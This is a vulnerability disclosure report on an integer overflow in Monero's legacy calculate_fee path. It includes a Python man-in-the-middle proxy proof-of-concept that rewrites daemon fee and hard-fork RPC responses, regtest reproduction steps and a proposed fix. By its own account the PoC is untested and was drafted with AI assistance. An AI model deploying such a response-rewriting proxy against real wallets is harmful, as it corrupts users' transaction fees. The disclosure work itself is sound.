# `wallet2::calculate_fee()` (legacy per-KB fee path) has no overflow guard, unlike its sibling `calculate_fee_from_weight()` which was just patched for the identical bug

## Summary

A recent commit on this project fixed an integer-overflow bug in `wallet2::calculate_fee_from_weight()`, where a `uint64_t` multiplication of two values ultimately sourced from a connected daemon's RPC responses (`weight * base_fee`) could silently wrap with no bounds check. The fix added an explicit pre-multiplication overflow check that throws a caught wallet exception instead.

Its sibling function, `wallet2::calculate_fee(uint64_t fee_per_kb, size_t bytes)` — which computes the exact same kind of value (a transaction fee, from the same kind of daemon-controlled `base_fee` input) via the older, still-live "legacy per-KB" fee-calculation path — was not touched by that fix and has no equivalent guard at all:

```cpp
uint64_t calculate_fee(uint64_t fee_per_kb, size_t bytes)
{
  uint64_t kB = (bytes + 1023) / 1024;
  return kB * fee_per_kb;
}
```

Both the `fee_per_kb` value and the flag that determines whether this legacy path is used instead of the now-protected weight-based path are taken directly from an unvalidated daemon RPC response, with no upper bound applied anywhere in the chain.

## Severity

Monero severity: **MEDIUM** (individual-wallet impact, requires a malicious or compromised daemon — matches the class of the sibling fix this bug was left out of).
Suggested CVSS v3.1: `4.8` with `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N`.

Rationale:
1. Requires the victim's wallet to be pointed at (or man-in-the-middled by) a malicious/compromised daemon — not exploitable against a wallet talking to an honest node (`AC:H`).
2. No authentication of any kind needed on the daemon side beyond simply being the node the wallet is configured to use — the default, unauthenticated `--daemon-address` scenario (`PR:N/UI:N`).
3. Impact is a miscalculated transaction fee value (integrity of the computed value), not direct fund transfer — matching the same impact class the maintainers evidently judged worth a dedicated fix for the sibling function (`I:L/A:N`).

## Affected Versions

Confirmed present, identically, in both:
- **`master`**, commit `9e3a31032ee2cf3cb65c908e107a9952d03bbc4f` (the actively maintained branch):
  https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/wallet/wallet2.cpp#L304-L308
  (compare the now-guarded sibling immediately below it: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/wallet/wallet2.cpp#L310-L316)
- **`v0.18.5.1`**, the latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`:
  https://github.com/monero-project/monero/blob/4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5/src/wallet/wallet2.cpp#L298-L302
  (here the sibling function is *also* unguarded, since the sibling fix itself postdates this release — that's expected and not part of this report; this report is specifically about the gap in `calculate_fee` that the sibling fix's own commit left behind, still open on `master` today)

## Root Cause

`src/wallet/wallet2.cpp`:

```cpp
uint64_t calculate_fee(uint64_t fee_per_kb, size_t bytes)
{
  uint64_t kB = (bytes + 1023) / 1024;
  return kB * fee_per_kb;
}

uint64_t calculate_fee_from_weight(uint64_t base_fee, uint64_t weight, uint64_t fee_quantization_mask)
{
  THROW_WALLET_EXCEPTION_IF(base_fee != 0 && weight > std::numeric_limits<uint64_t>::max() / base_fee,
      tools::error::wallet_internal_error, "Fee calculation overflow");
  uint64_t fee = weight * base_fee;
  fee = (fee + fee_quantization_mask - 1) / fee_quantization_mask * fee_quantization_mask;
  return fee;
}
```

Both functions multiply a byte/weight quantity by a per-unit fee rate to produce the transaction fee. Only the second one checks for overflow before multiplying.

**Both inputs to the unguarded function are attacker (daemon)-controlled, with no bound applied anywhere upstream:**

1. `fee_per_kb` (the `base_fee` parameter at call sites) comes from `NodeRPCProxy::get_dynamic_base_fee_estimate()`:
   ```cpp
   // src/wallet/node_rpc_proxy.cpp
   bool r = net_utils::invoke_http_json_rpc("/json_rpc", "get_fee_estimate", req_t, resp_t, m_http_client, rpc_timeout);
   RETURN_ON_RPC_RESPONSE_ERROR(r, epee::json_rpc::error{}, resp_t, "get_fee_estimate");
   ...
   m_dynamic_base_fee_estimate = resp_t.fee;
   ```
   `resp_t.fee` is stored verbatim from the daemon's `get_fee_estimate` response — no upper bound, no sanity check.

2. Which fee path is used at all — the now-protected `calculate_fee_from_weight` or the still-unguarded `calculate_fee` — is itself decided by `use_fork_rules(HF_VERSION_PER_BYTE_FEE)`:
   ```cpp
   bool wallet2::use_fork_rules(uint8_t version, int64_t early_blocks)
   {
     uint64_t height, earliest_height;
     ...
     result = m_node_rpc_proxy.get_earliest_height(version, earliest_height);
     ...
     bool close_enough = (int64_t)height >= (int64_t)earliest_height - early_blocks && earliest_height != std::numeric_limits<uint64_t>::max();
     ...
     return close_enough;
   }
   ```
   and `get_earliest_height()`'s value is, again, taken directly and unconditionally from the daemon's `hard_fork_info` response:
   ```cpp
   // src/wallet/node_rpc_proxy.cpp
   bool r = net_utils::invoke_http_json_rpc("/json_rpc", "hard_fork_info", req_t, resp_t, m_http_client, rpc_timeout);
   ...
   m_earliest_height[version] = resp_t.earliest_height;
   ```
   A malicious daemon can report an `earliest_height` for the per-byte-fee hard fork that is far in the future (or `UINT64_MAX`, explicitly excluded by name in the check above but any sufficiently large value has the same effect), making `use_fork_rules(HF_VERSION_PER_BYTE_FEE)` return `false` and forcing every fee computation in the wallet onto the legacy, unguarded `calculate_fee()` path — even against a wallet that is otherwise perfectly happy to operate on a current, post-fork chain in every other respect.

3. `calculate_fee(bool use_per_byte_fee, ...)` (the dispatcher both `estimate_fee()` and the real transaction-construction code call) makes exactly this choice:
   ```cpp
   uint64_t calculate_fee(bool use_per_byte_fee, const cryptonote::transaction &tx, size_t blob_size, uint64_t base_fee, uint64_t fee_quantization_mask)
   {
     if (use_per_byte_fee)
       return calculate_fee_from_weight(base_fee, cryptonote::get_transaction_weight(tx, blob_size), fee_quantization_mask);
     else
       return calculate_fee(base_fee, blob_size);
   }
   ```
   and is called from the real fee-calculation step inside actual transaction construction (`wallet2.cpp:10919, 10963, 11367, 11404` — this is `needed_fee`, the value used to build and sign the transaction the wallet sends, not merely a UI estimate).

With `fee_per_kb` set arbitrarily high by the malicious daemon's `get_fee_estimate` response, `kB * fee_per_kb` wraps in `uint64_t` arithmetic with no exception, no log, and no indication to the wallet that anything went wrong — producing a `needed_fee` value that bears no relationship to the real requested fee rate.

## Steps to Reproduce

### 1. Stand up a malicious/modified daemon that returns crafted RPC responses

The relevant behavior only requires modifying two JSON-RPC response fields; a minimal way to demonstrate the reachable, unguarded arithmetic without needing a full modified `monerod` build is to man-in-the-middle a wallet's daemon connection with a small proxy:

```python
#!/usr/bin/env python3
# poc_malicious_fee_daemon_proxy.py
#
# Sits between monero-wallet-cli/monero-wallet-rpc and a real monerod, and
# rewrites two JSON-RPC responses so the victim wallet is forced onto the
# unguarded calculate_fee() path with an extreme fee_per_kb value.
#
# Usage:
#   python3 poc_malicious_fee_daemon_proxy.py <listen_port> <real_daemon_host> <real_daemon_port>
#   Then point the victim wallet at http://127.0.0.1:<listen_port>

import http.server
import json
import sys
import urllib.request

REAL_HOST = None
REAL_PORT = None

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)

        try:
            doc = json.loads(body)
            method = doc.get("method", "")
        except Exception:
            method = ""

        real_url = f"http://{REAL_HOST}:{REAL_PORT}{self.path}"
        req = urllib.request.Request(real_url, data=body, method="POST",
                                      headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            real_body = resp.read()

        try:
            real_doc = json.loads(real_body)
        except Exception:
            real_doc = None

        if real_doc and "result" in real_doc:
            if method == "get_fee_estimate":
                # Force an extreme fee_per_kb value; comfortably enough to wrap
                # kB * fee_per_kb for any real transaction size (a few KB).
                real_doc["result"]["fee"] = 2**63
                real_doc["result"]["fees"] = [2**63]
                print("[proxy] rewrote get_fee_estimate.fee -> 2**63")
            elif method == "hard_fork_info":
                # Force use_fork_rules(HF_VERSION_PER_BYTE_FEE) to return false,
                # pushing every fee computation onto the unguarded legacy path.
                real_doc["result"]["earliest_height"] = 2**64 - 2
                print("[proxy] rewrote hard_fork_info.earliest_height -> 2**64-2")
            real_body = json.dumps(real_doc).encode()

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(real_body)

    def log_message(self, fmt, *args):
        pass

if __name__ == "__main__":
    listen_port = int(sys.argv[1]) if len(sys.argv) > 1 else 38080
    REAL_HOST = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
    REAL_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 38081

    server = http.server.HTTPServer(("127.0.0.1", listen_port), Handler)
    print(f"[proxy] listening on 127.0.0.1:{listen_port}, forwarding to {REAL_HOST}:{REAL_PORT}")
    server.serve_forever()
```

### 2. Run a real daemon behind the proxy, and a wallet pointed at the proxy

```
# Terminal 1: a real regtest daemon
./bin/monerod --regtest --fixed-difficulty 1 --offline \
  --data-dir /tmp/monero-poc-fee/chain \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 38081 --confirm-external-bind \
  --non-interactive &

# Terminal 2: the malicious proxy sitting in front of it
python3 poc_malicious_fee_daemon_proxy.py 38080 127.0.0.1 38081

# Terminal 3: a wallet pointed at the proxy instead of the real daemon
./bin/monero-wallet-cli --daemon-address 127.0.0.1:38080 --regtest \
  --generate-new-wallet /tmp/monero-poc-fee/testwallet --password "" --mnemonic-language English
```

### 3. Fund the test wallet and attempt a transfer

```
# From the wallet CLI, once it has funds via mining/regtest transfer from another wallet:
transfer <any-testnet-address> 1
```

### Expected result on the vulnerable build

The wallet computes `needed_fee` via the legacy `calculate_fee()` path (forced by the rewritten `hard_fork_info` response) using the rewritten, extreme `fee_per_kb` (`2**63`) from `get_fee_estimate` — `kB * fee_per_kb` wraps silently in `uint64_t` arithmetic. Depending on the exact wrapped value, the transaction either fails to construct with a fee-related error that does not match the fee the operator actually configured/expects (observable via `--log-level 2` tracing of `calculate_fee`'s inputs/output, or by instrumenting a debug build to print `needed_fee`), or a transaction is built and signed with a fee value that has no relationship to the real network fee rate — in contrast to the identical scenario run against the weight-based path, where `calculate_fee_from_weight` now cleanly throws `"Fee calculation overflow"` instead.

## Possible Solution

Add the same guard already applied to `calculate_fee_from_weight`:

```cpp
uint64_t calculate_fee(uint64_t fee_per_kb, size_t bytes)
{
  uint64_t kB = (bytes + 1023) / 1024;
  THROW_WALLET_EXCEPTION_IF(fee_per_kb != 0 && kB > std::numeric_limits<uint64_t>::max() / fee_per_kb,
      tools::error::wallet_internal_error, "Fee calculation overflow");
  return kB * fee_per_kb;
}
```

More generally, since both `fee_per_kb`/`base_fee` and the hard-fork-height gate that selects between the two fee paths are entirely daemon-controlled with no upper bound applied at the RPC-response layer (`NodeRPCProxy::get_dynamic_base_fee_estimate`/`get_earliest_height`), consider adding a sanity ceiling on `resp_t.fee`/`resp_t.fees` and `resp_t.earliest_height` at the point they are cached, so that a malicious daemon cannot drive wallet-side arithmetic into extreme, unvalidated values in the first place — closing this class of bug at its source rather than one call site at a time.

## Impact

A malicious or compromised daemon (or a man-in-the-middle on an unauthenticated `--daemon-address` connection, the default configuration) can force a connected wallet's fee computation for a real, to-be-signed transaction through an unguarded `uint64_t` multiplication with an extreme daemon-supplied rate, producing a wrapped/incorrect fee value — the exact same bug class and consequence the project just finished patching in the sibling function, left open in the legacy per-KB path.

## Note on AI usage

Source-code analysis (identifying `calculate_fee` as the unpatched sibling of the recently-fixed `calculate_fee_from_weight`, and tracing both attacker-controlled inputs — `get_fee_estimate`'s `fee` field and `hard_fork_info`'s `earliest_height` field — all the way from the daemon RPC response through `use_fork_rules`/`estimate_fee` to the real transaction-construction call sites) and drafting of this report were done with AI assistance, working directly against the `v0.18.5.1` and `master` source. **This has been verified by static code reading only, including confirming every link in the daemon-response-to-arithmetic chain (`NodeRPCProxy::get_dynamic_base_fee_estimate`, `NodeRPCProxy::get_earliest_height`, `wallet2::use_fork_rules`, `wallet2::calculate_fee` dispatcher, and the real call sites in transaction construction) against the actual current source — the PoC proxy script has been checked for correctness against this exact chain but has not been run against a live wallet/daemon pair.** Please run it and attach the resulting wallet log / observed fee behavior before submitting, per this program's requirement for a working PoC with logs.
